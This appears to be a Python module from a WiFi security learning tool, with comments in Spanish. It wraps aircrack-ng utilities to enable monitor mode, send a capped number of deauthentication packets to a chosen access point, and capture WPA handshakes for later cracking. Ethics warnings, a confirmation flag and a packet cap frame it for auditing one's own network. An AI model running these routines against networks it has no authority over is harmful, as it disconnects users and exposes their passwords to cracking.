# -*- coding: utf-8 -*-
"""
attacks - modulos ACTIVOS (solo Linux + adaptador en modo monitor).

  >>> USO ETICO Y LEGAL UNICAMENTE <<<
  Estos modulos solo deben usarse en TUS PROPIAS redes o en laboratorios /
  redes donde tengas permiso EXPLICITO por escrito. Mandar deauth o capturar
  handshakes de redes ajenas es ilegal en Mexico (y casi todo el mundo).
  Esta herramienta es para APRENDER como funcionan estos ataques y como
  defenderte de ellos.

Diseno "no muy potente" a proposito (peticion del usuario):
  - deauth con tope DURO de paquetes (no floods infinitos)
  - siempre pide confirmacion explicita (confirm=True) y un objetivo concreto
  - en Windows / sin herramientas => devuelve error claro, nunca ejecuta nada
"""
import subprocess

from . import platform_detect as plat

MAX_DEAUTH_PACKETS = 20   # tope duro: suficiente para aprender, no para hacer dano


def _guard():
    """Bloquea todo si no estamos en Linux con las herramientas necesarias."""
    if plat.os_name() != "linux":
        return "Los ataques activos solo funcionan en Linux (Kali/Parrot) con un " \
               "adaptador WiFi en modo monitor. Este equipo es {}.".format(plat.os_name())
    if not plat.is_root():
        return "Necesitas root: corre la app con sudo para modo monitor / deauth."
    return None


# ----------------------------------------------------------------------
#  Modo monitor
# ----------------------------------------------------------------------
def list_interfaces() -> dict:
    if plat.os_name() != "linux":
        return {"ok": False, "error": "Solo Linux.", "interfaces": []}
    try:
        out = subprocess.run(["iw", "dev"], capture_output=True, timeout=10)
        txt = out.stdout.decode("utf-8", "replace")
        ifaces = []
        cur = {}
        for line in txt.splitlines():
            line = line.strip()
            if line.startswith("Interface"):
                if cur:
                    ifaces.append(cur)
                cur = {"iface": line.split()[1], "mode": "?"}
            elif line.startswith("type") and cur:
                cur["mode"] = line.split()[1]
        if cur:
            ifaces.append(cur)
        return {"ok": True, "interfaces": ifaces}
    except Exception as e:
        return {"ok": False, "error": str(e), "interfaces": []}


def monitor_start(iface: str) -> dict:
    err = _guard()
    if err:
        return {"ok": False, "error": err}
    try:
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, timeout=20)
        out = subprocess.run(["airmon-ng", "start", iface], capture_output=True, timeout=20)
        return {"ok": True, "output": out.stdout.decode("utf-8", "replace"),
                "hint": "El adaptador suele quedar como {}mon o wlan0mon.".format(iface)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def monitor_stop(iface: str) -> dict:
    err = _guard()
    if err:
        return {"ok": False, "error": err}
    try:
        out = subprocess.run(["airmon-ng", "stop", iface], capture_output=True, timeout=20)
        subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True, timeout=20)
        return {"ok": True, "output": out.stdout.decode("utf-8", "replace")}
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ----------------------------------------------------------------------
#  Deauth (LIGERO: tope duro de paquetes, confirmacion obligatoria)
# ----------------------------------------------------------------------
def deauth(iface_mon: str, bssid: str, count: int = 5, client: str = None,
           confirm: bool = False) -> dict:
    """
    Envia `count` paquetes de deauth (topado a MAX_DEAUTH_PACKETS) para
    DEMOSTRAR el ataque en TU red. Requiere confirm=True y un BSSID valido.
    """
    err = _guard()
    if err:
        return {"ok": False, "error": err}
    if not confirm:
        return {"ok": False, "error": "Confirmacion requerida (confirm=True). "
                                      "Solo en redes propias o autorizadas."}
    if not bssid or len(bssid) != 17:
        return {"ok": False, "error": "BSSID invalido."}
    count = max(1, min(int(count or 5), MAX_DEAUTH_PACKETS))

    if not plat.has_tool("aireplay-ng"):
        return {"ok": False, "error": "Falta aireplay-ng (sudo apt install aircrack-ng)."}
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client and len(client) == 17:
        cmd += ["-c", client]
    cmd += [iface_mon]
    try:
        out = subprocess.run(cmd, capture_output=True, timeout=40)
        return {"ok": True, "cmd": " ".join(cmd), "packets": count,
                "output": out.stdout.decode("utf-8", "replace"),
                "note": "Enviados {} paquetes (tope {}). Uso etico unicamente.".format(
                    count, MAX_DEAUTH_PACKETS)}
    except Exception as e:
        return {"ok": False, "error": str(e), "cmd": " ".join(cmd)}


# ----------------------------------------------------------------------
#  Captura de handshake (WPA) para aprender / auditar TU red
# ----------------------------------------------------------------------
def capture_handshake(iface_mon: str, bssid: str, channel: int,
                      seconds: int = 30, out_prefix: str = "handshake") -> dict:
    err = _guard()
    if err:
        return {"ok": False, "error": err}
    if not plat.has_tool("airodump-ng"):
        return {"ok": False, "error": "Falta airodump-ng (sudo apt install aircrack-ng)."}
    if not bssid or len(bssid) != 17:
        return {"ok": False, "error": "BSSID invalido."}
    seconds = max(5, min(int(seconds or 30), 120))
    cmd = ["timeout", str(seconds), "airodump-ng", "--bssid", bssid,
           "-c", str(int(channel or 1)), "-w", out_prefix, iface_mon]
    try:
        subprocess.run(cmd, capture_output=True, timeout=seconds + 15)
        return {"ok": True, "cmd": " ".join(cmd),
                "note": "Si algun cliente se reconecto, el handshake quedo en "
                        "{}-01.cap. Analizalo con Wireshark o aircrack-ng.".format(out_prefix)}
    except Exception as e:
        return {"ok": False, "error": str(e), "cmd": " ".join(cmd)}
